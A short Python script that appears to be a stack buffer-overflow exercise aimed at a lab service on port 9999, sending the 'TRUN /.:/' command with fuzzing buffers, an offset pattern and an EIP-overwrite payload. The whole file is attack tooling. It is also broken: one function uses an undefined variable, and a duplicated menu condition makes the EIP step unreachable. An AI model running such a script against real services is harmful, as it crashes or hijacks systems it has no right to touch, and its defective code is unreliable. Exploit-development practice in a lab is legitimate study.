#!/usr/bin/python3
import sys
import socket
from time import sleep


def border():
    print("-" * 50)


def try_fuzzing(target_ip, target_port, cmd_attacking):
    buffer_count = 100
    buffer = "A" * buffer_count
    while True:
        try:
            print(f'Trying buffer size of {str(len(buffer))} bytes')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            payload = (cmd_attacking + buffer)
            s.send((payload.encode()))
            s.close()
            sleep(1)
            buffer_count += 100
            buffer += "A" * buffer_count
        except:
            print("Fuzzing crashed at %s bytes" % str(len(buffer)))
            border()
            sys.exit()


def try_offset(target_ip, target_port, cmd_attacking):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        payload = cmd_attacking + offset
        s.send(payload.encode())
        s.close()
    except:
        print("Error connecting to server")
        border()
        sys.exit()


def try_overwrite_eip(offset, target_ip, target_port, cmd_attacking):
    # B = 42424242 in EIP
    shellcode = "A" * offset + "B" * 4

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        payload = cmd_attacking + shellcode
        s.send(payload.encode())
        s.close()
    except:
        print("Error connecting to server")
        border()
        sys.exit()

def main():
    target_ip = "192.168.57.13"
    target_port = 9999
    cmd_attacking = 'TRUN /.:/'
    #target_ip = str(input('Enter victim ip: '))
    #target_port = int(input('Enter victim port: '))
    #cmd_attacking = str(input('Enter cmd to attack: '))

    border()
    print("Options: \n\n1. Fuzzing \n2. Offset \n3. Overwrite EIP \n")
    option = int(input("Enter option: "))
    border()

    if option == 1:
        try_fuzzing(target_ip, target_port, cmd_attacking)
    elif option == 2:

        try_offset(target_ip, target_port, cmd_attacking)
    elif option == 2:
        offset = int(input("Enter the offset value: "))
        try_overwrite_eip(offset, target_ip, target_port, cmd_attacking)


main()
